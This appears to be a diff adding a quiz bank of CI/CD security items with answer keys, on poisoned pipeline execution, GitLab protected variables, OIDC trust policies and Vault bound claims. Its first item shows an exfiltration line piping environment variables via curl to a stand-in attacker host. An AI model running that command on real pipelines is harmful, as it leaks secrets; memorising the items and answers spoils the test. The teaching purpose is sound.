@@ -1,0 +1,250 @@
+[
+  {
+    "obj": "1.3",
+    "q": "In their feature branch, a developer adds the line \"env | curl -d @- https://napadac.example\" to .gitlab-ci.yml and pushes. The pipeline runs and sends out the variables. What is this attack called and which control would prevent theft of production secrets?",
+    "options": [
+      "Dependency confusion; a private PyPI mirror",
+      "Direct PPE; production secrets as protected variables, available only to protected branches",
+      "Indirect PPE; masked variables",
+      "Public PPE; CODEOWNERS for the Makefile"
+    ],
+    "answer": 1,
+    "explain": "Changing the CI file itself in a branch is direct PPE. A feature branch doesn't get protected variables at all. Masking doesn't help because malicious code can encode the value, dependency confusion is a different risk (CICD-SEC-3), and the attack didn't come from a fork."
+  },
+  {
+    "obj": "1.3",
+    "q": ".gitlab-ci.yml is protected via CODEOWNERS and nobody outside the platform team can change it. Still, an attacker with the Developer role steals the test job's secrets. The job only runs \"pip install -r requirements.txt && pytest\". What did they most likely modify?",
+    "options": [
+      "tests/conftest.py or some other file that pytest executes",
+      ".gitlab-ci-local-variables.yml",
+      "README.md",
+      "The project's protected branch settings"
+    ],
+    "answer": 0,
+    "explain": "That is indirect PPE: the CI file is protected, but the job executes code from the repo (conftest.py, setup.py, Makefile). README isn't executed, the local variables file isn't part of the GitLab pipeline, and a Developer can't change branch protection settings."
+  },
+  {
+    "obj": "1.3",
+    "type": "match",
+    "q": "Match the finding from a GitLab instance review with the risk from the OWASP Top 10 CI/CD.",
+    "options": [
+      "A static AWS key in a project variable, created 3 years ago",
+      "A developer can push directly to main and thereby trigger a production deploy",
+      "The deploy job pulls an image by tag without verifying the signature",
+      "Nobody monitors audit events about changes to variables and runners"
+    ],
+    "targets": [
+      "CICD-SEC-10 Insufficient Logging and Visibility",
+      "CICD-SEC-6 Insufficient Credential Hygiene",
+      "CICD-SEC-3 Dependency Chain Abuse",
+      "CICD-SEC-1 Insufficient Flow Control Mechanisms",
+      "CICD-SEC-9 Improper Artifact Integrity Validation"
+    ],
+    "answer": [
+      1,
+      3,
+      4,
+      0
+    ],
+    "explain": "A long-lived static key is poor credential hygiene (6), pushing to main without review is weak flow control (1), an image without signature verification is an artifact integrity problem (9), and an unmonitored audit log is a lack of visibility (10). Dependency Chain Abuse is a distractor."
+  },
+  {
+    "obj": "1.3",
+    "q": "A self-managed runner has a config.toml with executor = \"docker\" and volumes = [\"/var/run/docker.sock:/var/run/docker.sock\", \"/cache\"]. Why is this risky?",
+    "options": [
+      "The cache in /cache isn't cleared between jobs",
+      "The Docker socket slows down image pulls",
+      "Any job can use the Docker socket to start a privileged container and take over the runner host",
+      "The Docker executor doesn't support id_tokens when the socket is mounted"
+    ],
+    "answer": 2,
+    "explain": "Access to the Docker socket is effectively root on the host: a job can start a container with / mounted and in privileged mode, and reach other jobs' secrets. To build images use rootless BuildKit, Kaniko or Buildah. The other claims are either false or not a security problem of that magnitude."
+  },
+  {
+    "obj": "1.3",
+    "q": "Production deploys go to a runner with the tag prod-deploy. Any developer can write tags: [prod-deploy] in a feature branch. What ensures that a job from a feature branch doesn't run on that runner?",
+    "options": [
+      "A runner tag that starts with prod-",
+      "The runner is marked as protected, so it runs only jobs from protected branches and tags",
+      "rules: if: $CI_COMMIT_BRANCH == \"main\" in the deploy job",
+      "allowed_images in config.toml"
+    ],
+    "answer": 1,
+    "explain": "A protected runner accepts only jobs from pipelines on protected branches/tags, and an attacker can't change that from their branch. The tag and rules are in the CI file that the attacker controls in their branch, and allowed_images restricts images, not the job's origin."
+  },
+  {
+    "obj": "1.3",
+    "q": "A public project accepts MRs from forks. A maintainer wants to run the pipeline in the parent project for an MR from a fork because the tests need the parent's runners. What must they do BEFORE running it?",
+    "options": [
+      "Read the diff, especially the CI files and scripts the pipeline executes, because that code will get access to the parent project's variables",
+      "Nothing: fork pipelines never see the parent project's variables",
+      "Disable variable masking so the logs are readable",
+      "Add allow_failure: true to all jobs"
+    ],
+    "answer": 0,
+    "explain": "When a pipeline for a fork MR runs in the parent project, the fork's code runs with the parent project's environment; that is the path to public PPE. By default a fork pipeline runs in the fork without the parent's variables, but this option changes that. Masking and allow_failure are irrelevant."
+  },
+  {
+    "obj": "1.3",
+    "q": "All projects include the security jobs like this:\ninclude:\n  - project: shop/ci-templates\n    file: /templates/security.yml\nWhat is the problem?",
+    "options": [
+      "include doesn't support the project key, only local",
+      "The file must have the .gitlab-ci.yml extension",
+      "stage: security is missing",
+      "Without ref, the template's default branch is included, so every change to it immediately affects all pipelines; ref should be pinned to a tag or SHA"
+    ],
+    "answer": 3,
+    "explain": "Without ref, GitLab takes HEAD of the template project's default branch. A compromised or wrong commit in the template immediately runs in all projects. include:project is valid syntax, the file name is arbitrary, and stage is defined in the jobs themselves."
+  },
+  {
+    "obj": "1.3",
+    "q": "A GitHub Actions workflow has on: pull_request_target and an actions/checkout step with ref: ${{ github.event.pull_request.head.sha }}, followed by make test. Why is this dangerous?",
+    "options": [
+      "pull_request_target doesn't support checkout",
+      "Code from the fork runs in the context of the base repo, with secrets and a token with write permissions",
+      "head.sha is not a stable reference",
+      "make is not available on ubuntu-latest runners"
+    ],
+    "answer": 1,
+    "explain": "pull_request_target runs with the base repo's secrets and GITHUB_TOKEN, and here unreviewed code from the fork is explicitly checked out and executed: public PPE. To test code from a fork, use pull_request. The other claims are false."
+  },
+  {
+    "obj": "1.4",
+    "q": "An old deploy job fails with an authentication error against Vault after upgrading GitLab to 17.x. The job contains: vault write auth/jwt/login role=deploy jwt=$CI_JOB_JWT_V2. What is the cause and the fix?",
+    "options": [
+      "The Vault role has expired; extend token_max_ttl",
+      "The JWT auth method was removed in Vault 2.x; switch to AppRole",
+      "CI_JOB_JWT_V2 was removed in GitLab 17.0; define id_tokens with an aud that matches the role's bound_audiences and use that variable",
+      "The variable must be protected; mark CI_JOB_JWT_V2 as protected"
+    ],
+    "answer": 2,
+    "explain": "CI_JOB_JWT and CI_JOB_JWT_V2 were removed in GitLab 17.0; the replacement is id_tokens with an explicit aud. The JWT auth method still exists in Vault, and predefined variables can't be marked as protected."
+  },
+  {
+    "obj": "1.4",
+    "q": "The AWS trust policy for a GitLab OIDC role has only a StringEquals condition on gitlab.kurs-shop.ba:aud. What is the risk?",
+    "options": [
+      "Any project and branch on that GitLab instance can assume the role, because the sub claim isn't checked",
+      "The role can't be assumed because aud must be sts.amazonaws.com",
+      "The token will expire before Terraform finishes",
+      "CloudTrail won't record AssumeRoleWithWebIdentity"
+    ],
+    "answer": 0,
+    "explain": "aud only says who the token is intended for; any job on the instance can request a token with that aud. Without a condition on sub (project, branch), anyone with access to the instance can assume the role. aud is an arbitrary value you agree on with the provider, and CloudTrail records the call regardless of conditions."
+  },
+  {
+    "obj": "1.4",
+    "q": "You want a Vault role to issue production secrets only to jobs of the shop/kurs-shop project running on protected branches. Which bound_claims are correct?",
+    "options": [
+      "{\"namespace_path\": \"shop\"}",
+      "{\"project_path\": \"shop/kurs-shop\", \"pipeline_source\": \"merge_request_event\"}",
+      "{\"user_login\": \"andrija\"}",
+      "{\"project_path\": \"shop/kurs-shop\", \"ref_protected\": \"true\"}"
+    ],
+    "answer": 3,
+    "explain": "project_path binds the role to the project, and ref_protected: \"true\" to protected branches and tags, which blocks D-PPE from feature branches. namespace_path allows all projects in the group, merge_request_event would allow precisely unreviewed code, and user_login binds to a person, not to the pipeline context."
+  },
+  {
+    "obj": "1.4",
+    "q": "A team marked all secrets as Masked and believes they are safe from PPE attacks. What do you tell them?",
+    "options": [
+      "That's correct; masked variables can never be extracted from a job",
+      "Masking only replaces the exact value in the log; a malicious job can encode it or send it over the network. Against PPE you need Protected (and environment scope or Vault with ref_protected)",
+      "They should be marked as Masked and hidden, then the job won't be able to read them",
+      "They should be moved into .gitlab-ci.yml under variables: because there they aren't available to feature branches"
+    ],
+    "answer": 1,
+    "explain": "Masking protects against accidental printing, not against code that deliberately steals the value. Hidden only hides the value in the UI, and the job still gets it. Values in .gitlab-ci.yml are in the repo and visible to everyone: the worst option."
+  },
+  {
+    "obj": "1.4",
+    "q": "A deploy job has:\nid_tokens:\n  VAULT_ID_TOKEN:\n    aud: https://vault.kurs-shop.ba\nsecrets:\n  DB_PASSWORD:\n    vault: kurs-shop/prod/db/password@secret\n    token: $VAULT_ID_TOKEN\nThe script runs cat \"$DB_PASSWORD\" and prints the password, while the mysql client receives a path instead of the password. Why?",
+    "options": [
+      "secrets:vault writes the value to a temporary file by default, and the variable contains the path; to get the value directly in the variable, add file: false",
+      "The path must be secret/data/kurs-shop/prod/db",
+      "aud must equal VAULT_SERVER_URL without https://",
+      "token: must not be specified when there is only one ID token"
+    ],
+    "answer": 0,
+    "explain": "secrets produce a file-type variable by default (a path to a file containing the value); file: false puts the value directly in the variable. The path/field@mount format is correct, aud is an arbitrary value that must match bound_audiences, and token: is allowed."
+  },
+  {
+    "obj": "1.4",
+    "q": "terraform plan in the MR pipeline and terraform apply on main use the same AWS role with AdministratorAccess. What is the best improvement according to the principle of least privilege?",
+    "options": [
+      "Add allow_failure: true to the plan job",
+      "Put AWS keys in a masked variable instead of using OIDC",
+      "Two roles: a read-only role for plan (MR branches allowed too) and a role with write permissions only for main/the protected environment, separated by conditions on sub",
+      "Run plan and apply in the same job so the token lasts less"
+    ],
+    "answer": 2,
+    "explain": "Plan needs only read access, and MR code is less trusted; apply with write permissions should be bound to main and the protected environment. Static keys are a step backwards, allow_failure doesn't reduce permissions, and merging the jobs would give write permissions to MR code too."
+  },
+  {
+    "obj": "1.4",
+    "type": "order",
+    "q": "Order the steps for migrating a deploy job from a static AWS key to GitLab OIDC without downtime.",
+    "options": [
+      "Delete the old access key and the CI variables holding the key",
+      "Create the IAM OIDC provider and a role with a trust policy that checks aud and sub",
+      "Verify in IAM (LastUsedDate) and CloudTrail that the old key is no longer used",
+      "Add id_tokens and assume-role-with-web-identity to the job and let it run through the new role"
+    ],
+    "answer": [
+      1,
+      3,
+      2,
+      0
+    ],
+    "explain": "First the provider and role, then the job that uses it, then confirmation that nobody uses the old key any more, and only then deleting the key. Deleting before verifying risks breaking some forgotten job."
+  },
+  {
+    "obj": "1.4",
+    "q": "The test job and the deploy job both see the same variable PROD_DB_PASSWORD (protected). The test job runs on main after a merge, so it also gets the production password. Which GitLab setting most directly restricts the variable to deploy only?",
+    "options": [
+      "Masked and hidden",
+      "Minimum role to use pipeline variables set to no_one_allowed",
+      "Expand variable reference disabled",
+      "The variable's environment scope set to production, with environment: production in the deploy job"
+    ],
+    "answer": 3,
+    "explain": "Environment scope gives the variable only to jobs with the matching environment, so the test job on main doesn't get it (CICD-SEC-5). Hidden and expand affect display and interpolation, and minimum role restricts who may set pipeline variables."
+  },
+  {
+    "obj": "1.4",
+    "type": "match",
+    "q": "Match the GitLab mechanism with the threat it primarily protects against.",
+    "options": [
+      "Protected variable",
+      "Masked variable",
+      "Protected environment with required approval",
+      "id_tokens with a separate aud for each target"
+    ],
+    "targets": [
+      "A production deploy without another person's approval",
+      "A token intended for Vault accepted by another service",
+      "Accidental printing of a secret in a job log",
+      "A job from a feature branch gets a production secret"
+    ],
+    "answer": [
+      3,
+      2,
+      0,
+      1
+    ],
+    "explain": "A protected variable isn't available to unprotected branches, masking hides the exact value in the log, a protected environment requires permission to deploy, and different aud values prevent a token from being used with the wrong recipient."
+  },
+  {
+    "type": "spot",
+    "obj": "1.4",
+    "q": "This .gitlab-ci.yml deploys kurs-shop to production. Mark the lines that violate pipeline identity principles: what the credentials are and when the deploy may run.",
+    "snippet": "variables:\n  AWS_ACCESS_KEY_ID: AKIA4EXAMPLE7QXZ2LMN\n  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n\nunit-tests:\n  stage: test\n  image: node:20.11-alpine\n  script: [npm ci, npm test]\n\ndeploy-prod:\n  stage: deploy\n  image: amazon/aws-cli:2.15.0\n  script:\n    - aws s3 sync dist/ s3://kurs-shop-prod --delete\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"",
+    "lang": "yaml",
+    "answer": [
+      1,
+      2,
+      15
+    ],
+    "explain": "Static AWS keys in .gitlab-ci.yml live in git: anyone who can read the repo sees them and they stay in history, and as global variables every job gets them, including unit-tests, which executes code from the MR. Fix: revoke and rotate the keys, and have the deploy job use id_tokens (aud for AWS) and AssumeRoleWithWebIdentity into a role whose trust allows only the protected branch. The merge_request_event rule runs a production deploy on unreviewed MR code (poisoned pipeline execution); deploy should run only from a protected branch, e.g. if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH, with a protected environment."
+  }
+]
